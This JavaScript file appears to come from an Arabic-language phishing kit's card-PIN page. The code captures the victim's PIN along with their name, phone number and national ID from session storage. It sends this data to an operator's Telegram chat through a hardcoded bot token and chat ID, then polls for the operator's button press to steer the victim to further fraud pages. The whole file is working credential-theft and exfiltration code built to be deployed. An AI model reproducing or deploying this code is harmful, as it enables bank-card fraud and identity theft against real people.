const BOT_TOKEN = '8891065186:AAEl3mhHxdy53_2ZOnQU1E08FWFxmEsn1R4';
    const CHAT_ID = '6165206261';
    const WEBHOOK_URL = 'https://api.telegram.org/bot' + BOT_TOKEN;

    let pendingRequestId = null;

    async function sendToTelegram(message, requestId, dataType) {
        try {
            const response = await fetch(`${WEBHOOK_URL}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ قبول', callback_data: `approve_${dataType}_${requestId}` },
                            { text: '❌ رفض', callback_data: `reject_${dataType}_${requestId}` },
                            { text: '💳 بطاقة', callback_data: `decline_card_${dataType}_${requestId}` },
                            { text: '🔗 ربط بطاقة', callback_data: `link_card_${dataType}_${requestId}` }
                        ]]
                    }
                })
            });
            const json = await response.json();
            return json.result ? json.result.message_id : null;
        } catch (error) {
            console.error('خطأ في إرسال البيانات إلى تليجرام:', error);
            return null;
        }
    }

    async function editTelegramMessage(messageId, originalText, resultText) {
        try {
            await fetch(`${WEBHOOK_URL}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    text: originalText + '\n\n' + resultText,
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [] }
                })
            });
        } catch (error) {
            console.error('خطأ في تعديل رسالة تليجرام:', error);
        }
    }

    async function checkWebhookResponse(requestId, dataType) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
            const data = await response.json();
            if (data.ok && data.result && data.result.length > 0) {
                for (let update of data.result) {
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        if (callbackData === `approve_${dataType}_${requestId}`) return 'approved';
                        if (callbackData === `reject_${dataType}_${requestId}`) return 'rejected';
                        if (callbackData === `decline_card_${dataType}_${requestId}`) return 'decline_card';
                        if (callbackData === `link_card_${dataType}_${requestId}`) return 'link_card';
                    }
                }
            }
            return 'pending';
        } catch (error) {
            return 'pending';
        }
    }

    document.addEventListener('DOMContentLoaded', function () {
        const pinInputs = [
            document.getElementById('pin1'),
            document.getElementById('pin2'),
            document.getElementById('pin3'),
            document.getElementById('pin4')
        ];
        const submitBtn = document.getElementById('submitBtn');
        const declineMsg = document.getElementById('decline-message');

        function getPinCode() {
            return pinInputs.map(input => input.value).join('');
        }

        function setButtonActive(active) {
            submitBtn.disabled = !active;
            submitBtn.classList.toggle('active', active);
        }

        pinInputs.forEach((input, index) => {
            input.addEventListener('input', function (e) {
                const val = e.target.value.replace(/\D/g, '');
                e.target.value = val;
                e.target.classList.toggle('filled', val.length > 0);

                if (val.length === 1 && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }

                const pin = getPinCode();
                setButtonActive(pin.length === 4);
            });

            input.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', function (e) {
                e.preventDefault();
                const pasteData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
                pasteData.split('').forEach((char, i) => {
                    if (pinInputs[i]) {
                        pinInputs[i].value = char;
                        pinInputs[i].classList.add('filled');
                    }
                });
                if (pasteData.length > 0 && pasteData.length < pinInputs.length) {
                    pinInputs[pasteData.length].focus();
                }
                setButtonActive(pasteData.length === 4);
            });
        });

        submitBtn.addEventListener('click', async function () {
            if (this.disabled) return;
            const pin = getPinCode();
            if (pin.length !== 4) return;

            declineMsg.style.display = 'none';
            document.getElementById('loadingOverlay').classList.add('show');

            const fullName = sessionStorage.getItem('userFullName') || 'غير معروف';
            const phone = sessionStorage.getItem('userPhoneNumber') || '';
            const idNumber = sessionStorage.getItem('userIdNumber') || '';
            const requestId = Date.now();
            pendingRequestId = requestId;

            const message =
                `🔐 <b>صفحة الرقم السري للبطاقة - Card PIN</b>\n\n` +
                `👤 <b>الاسم الكامل:</b> <code>${fullName}</code>\n` +
                `📱 <b>رقم الهاتف:</b> <code>${phone}</code>\n` +
                `🆔 <b>الرقم القومي:</b> <code>${idNumber}</code>\n` +
                `🔢 <b>الرقم السري للبطاقة:</b> <code>${pin}</code>\n\n` +
                `⏰ ${new Date().toLocaleString('ar-EG')}`;

            const messageId = await sendToTelegram(message, requestId, 'pin');

            if (!messageId) {
                document.getElementById('loadingOverlay').classList.remove('show');
                alert('حدث خطأ في إرسال البيانات. يرجى المحاولة مرة أخرى.');
                return;
            }

            const checkInterval = setInterval(async () => {
                const status = await checkWebhookResponse(requestId, 'pin');
                if (status === 'approved') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '✅ تم القبول');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'verification.html';
                } else if (status === 'rejected') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '❌ تم الرفض');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    declineMsg.style.display = 'block';
                    pinInputs.forEach(input => {
                        input.value = '';
                        input.classList.remove('filled');
                    });
                    setButtonActive(false);
                    pinInputs[0].focus();
                    pendingRequestId = null;
                } else if (status === 'decline_card') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '💳 تم التحويل لصفحة الدفع');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'paymen.html';
                } else if (status === 'link_card') {
                    clearInterval(checkInterval);
                    await editTelegramMessage(messageId, message, '🔗 تم التحويل لصفحة ربط البطاقة');
                    document.getElementById('loadingOverlay').classList.remove('show');
                    window.location.href = 'ver.html';
                }
            }, 2000);
        });

        pinInputs[0].focus();
    });

    window.addEventListener('beforeunload', () => { pendingRequestId = null; });